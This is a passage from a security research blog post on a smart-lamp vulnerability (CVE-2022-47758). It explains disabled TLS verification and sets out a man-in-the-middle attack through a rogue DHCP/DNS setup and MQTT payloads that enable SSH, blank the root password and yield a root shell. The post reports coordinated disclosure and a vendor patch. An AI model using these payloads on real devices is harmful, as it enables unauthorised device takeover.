$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /sbin/reboot" --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption><p><span style="white-space: pre-wrap;">A rewind to the PoC exploit payload commands</span></p></figcaption></figure><h3 id="investigating-the-communication-protocol">Investigating the communication protocol</h3><p>Now we have a primitive for our exploit: a debugging endpoint which could be abused if we could send messages on the <code>/acme/device/serialno/exec/server</code> channel of the MQTT broker. Mind you, it would cause CHAOS if this MQTT broker could be hacked to allow an attacker to send messages to all devices connected to the MQTT broker. Since we don't want to try to hack the vendor since it would be cybercrime, we aren't going to test the official MQTT broker, so we tried to find ways to MitM the traffic going to <code>mqtt.acme.org</code>, however we couldn't succeed since it used TLS... But - we asked ourselves - what if the TLS configuration was insecure? E.g. an insecure version?</p><p>In order to find the TLS configuration, we dug into the functions that were called to setup the MQTT client: <code>cloud_pipe_subscribe</code> and <code>cloud_pipe_start</code>. By running a simple <code>grep -iRe 'cloud_pipe_subscribe'</code> query again, we can see that our function is originating from <code>/acme_config/acme_programs/libcloudpipe.so</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ grep -iRe 'cloud_pipe_subscribe'
grep: lib/libcloudpipe.so: binary file matches
grep: acme_config/acme_programs/cloud_daemon: binary file matches
grep: acme_config/acme_programs/libcloudpipe.so: binary file matches
grep: sbin/cloud_daemon: binary file matches</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>grep</span></code><span style="white-space: pre-wrap;"> - utility for searching strings</span></p></figcaption></figure><p>An interesting part of the <code>cloud_pipe_start()</code> function is the subsystem where a TLS network connection gets initiated by <code>ConnectNetwork()</code> and the MQTTClient gets initiated by <code>MQTTClient()</code>. We can find the TLS configuration in <code>ConnectNetwork()</code> and I quickly identified the used TLS library as <a href="https://github.com/Mbed-TLS/mbedtls">mbedtls</a>. Whilst searching for documentation of the used functions in the mbedtls library, I found out that the parameter <code>MBEDTLS_SSL_VERIFY_NONE</code> gets passed to the configuration function <code>mbedtls_ssl_conf_authmode</code>. This means that <strong>TLS certifications are not validated...</strong></p><figure class="kg-card kg-code-card"><pre><code class="language-c">  sprintf(port_str,"%d",port);
  printf("  . Connecting to %s:%s...",addr,port_str);
  fd_stdout = stdout;
  fflush(stdout);
  param1 = mbedtls_net_connect(&amp;ctx_net,addr,port_str,0);
  if (param1 != 0) {
    printf(" failed\n  ! mbedtls_net_connect returned %d\n\n",param1);
    return -1;
  }
  puts(" ok");
  initiated_seed = 0;
  printf("  . Setting up the SSL/TLS structure...");
  fflush(fd_stdout);
  pcVar4 = (char *)0x0;
  pcVar3 = (code *)0x0;
  success = mbedtls_ssl_config_defaults((undefined4 *)&amp;ssl_config,0,0,0);
  if ((int *)success == (int *)0x0) {
    puts(" ok");

    // mbedtls_ssl_conf_authmode() - Set the certificate verification mode
    // 
    // #define MBEDTLS_SSL_VERIFY_NONE 0
    mbedtls_ssl_conf_authmode((int)&amp;ssl_config,0);
    mbedtls_ssl_conf_rng(ssl_config, mbedtls_ctr_drbg_random, &amp;ctx_ctr_drbg_init);
    pcVar3 = (code *)fd_stdout;
    mbedtls_ssl_conf_dbg((int)&amp;ssl_config,&amp;LAB_0002d068,fd_stdout);
    success = mbedtls_ssl_setup((undefined4 *)&amp;DAT_00100838,&amp;ssl_config);</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ConnectNetwork()</span></code><span style="white-space: pre-wrap;"> - create the TLS connection to a server</span></p></figcaption></figure><p>We have the final piece.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>The primitives in our exploit are complete: we have a dangerous debugging endpoint listening to a server which can be eavesdropped. Now it's a matter of performing a Man-in-the-Middle (MitM) attack on the MQTT broker and creating a payload to send.</p><p>We have plenty of options to MitM network traffic when the TLS certifications aren't verified, but our favorite approach is using a rogue DHCP server to serve fake DNS records. We picked the <code>isc-dhcp-server</code> DHCP service because it works on Linux and because it's very customizable. We're using option <code>domain-name-server</code> to set the DNS server to <code>192.168.128.10</code> on the smart lamp. This means that if the lamp requests <code>mqtt.acme.org</code>, it will be resolved by our own DNS resolver over at <code>192.168.128.10</code></p><p>We used <code>bind9</code> as a DNS resolver in order to create fake DNS zones/records. We created a basic type A (IPv4) DNS record for <code>mqtt.acme.org</code> which redirects to our own MQTT broker <code>192.168.128.10</code>. Usually these kind of attacks are prevented by verifying the TLS certifications of the broker as a client, but the smart lamp did not perform those verification checks. </p><p>For the final serice we needed an MQTT broker, for which we chose <code>mosquitto</code>. We didn't configure it at all and just made sure that it was possible to publish and subscribe to any MQTT channels. However, we had to make sure that our service was running on port 443 (which is typically used for HTTPS), that it supported TLS, and that anonymous logins were allowed (anonymous login means that any username/password is allowed to login). </p><p>Now we have our entire infrastructure up and running, we need to send the payload commands to our own MQTT broker. We can easily use the <code>mosquitto_pub</code> utility for this to publish our own messages to specific channels. Additionally, we can use the <code>mosquitto_sub</code> utility for subscribing to other channels so that we can receive stdout from the smart lamp. In order to easily get our very own OpenSSH server we need to create a file called <code>/acme_config/ssh_enabled</code> and reboot. However, <code>root</code> is the only user with a default shell (<code>/bin/ash</code>)  but we don't know its password. </p><figure class="kg-card kg-code-card"><pre><code>$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/passwd</span></code><span style="white-space: pre-wrap;"> - contains user information</span></p></figcaption></figure><p>We can overwrite the root password using <code>passwd -d</code> which resets the password to be empty, and the OpenSSH will gladly accept that. This means that we can essentially start an OpenSSH server using <code>touch /acme_config/ssh_enabled &amp;&amp; passwd -d &amp;&amp; reboot</code>. However, in practice our commands get executed using <code>execv(char* filepath, char** argv)</code>. This means that we need to execute the commands seperately with the full path. Hence, our payload is as follows:</p><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/touch /acme/ssh_enabled" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /bin/passwd -d root" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "stop" --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m "debug /sbin/reboot" --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><p>When we execute this, we start the OpenSSH server and we can log in as root:</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~$ whoami
root</code></pre><h2 id="conclusion">Conclusion</h2><p>As we have discovered in this article, a critical vulnerability was found in many, many IoT smart lighting devices, allowing attackers to gain control over the entire device and access sensitive information. This serves as a reminder of the importance of IoT security for both vendors and consumers.</p><p>As consumers, we can follow these best practices to enhance the security of our home network:</p><ol><li>Keep devices' software up-to-date to prevent vulnerabilities from being exploited.</li><li>Keep smart devices on a separate sub-network to reduce privacy concerns.</li><li>Use long passwords (even pass-sentences) and two-factor authentication where possible.</li><li>Disable unused or unnecessary services and ports on devices.</li></ol><p>As developers, we can implement the following best practices to ensure the security of our IoT devices:</p><ol><li>Conduct thorough security assessments and penetration testing to identify and fix vulnerabilities before deploying devices.</li><li>Implement encryption and authentication mechanisms to secure data transmitted between the device and the server.</li><li>Use secure coding practices and avoid insecure software libraries.</li><li>Regularly update and patch devices to fix security vulnerabilities (and do it fast :-) ).</li></ol><p>By following these best practices, we can reduce the risk of security breaches and ensure the safety and security of our connected devices and home networks.</p><p>Furthermore, the vulnerabilities in said smart lamps were patched by the vendor in early January 2023, about a month after coordinated vulnerability disclosure. The vendor gave us explicit permission to publish this blogpost - under the agreement we wouldn't mention the vendors name nor product name - and gave us permission to publish <code>CVE-2022-47758</code>. </p><p></p><p>We hope this blogpost has been as interesting to read for you as it was for us to write, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/nftables/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques
                </h2>
            </header>
                <div class="post-card-excerpt">A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu instances with a double-free in nf_tables in the Linux kernel, using novel techniques like Dirty Pagedirectory. All without even having to recompile the exploit for different kernel targets once.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-03-26">Mar 26, 2024</time>
                <span class="post-card-meta-length">77 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Unleashing ksmbd: crafting remote exploits of the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                <span class="post-card-meta-length">10 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://pwning.tech">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=484755abd6"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<!-- plugins like copy btn and line numbers -->
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js" integrity="sha512-st608h+ZqzliahyzEpETxzU0f7z7a9acN6AFvYmHvpFhmcFuKT8a22TT5TpKpjDa3pt3Wv7Z3SdQBCBdDPhyWA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" integrity="sha512-/kVH1uXuObC0iYgxxCKY41JdWOkKOxorFVmip+YVifKsJ4Au/87EisD1wty7vxN2kAhnWh6Yc8o/dSAXj6Oz7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<!--<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-->

<!-- themees -->
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-makefile.min.js" integrity="sha512-9MXjDxOwWNLJZRSwZRFdc1lvSIxld5c9DeLhySKjTAIEpj8a48Kezdc/hKjUsyD8S+oa3a+5SpuqdcCFodSI3Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markdown.min.js" integrity="sha512-IHQR8J+JbQpZ1tjkHkq8Ivsgo6ovfnYbQnYzmoKCjTCQG90YVs9l+2P14DRIZ94VBrB+F86Ju4wSGOMOjfVCQQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script data-goatcounter="https://french5937.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>

<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.25.0/tocbot.min.js" integrity="sha512-P4MxNnVYFHmkj6ZlNusCPMjrqfYF7/AWRM0m7vEHkzTITuiW/6LaXk/Ah/mheuPI1xI80it2dP/8Nz+FLJT9MQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
  $(".gh-search.gh-icon-btn").remove();
</script>

</body>
</html>
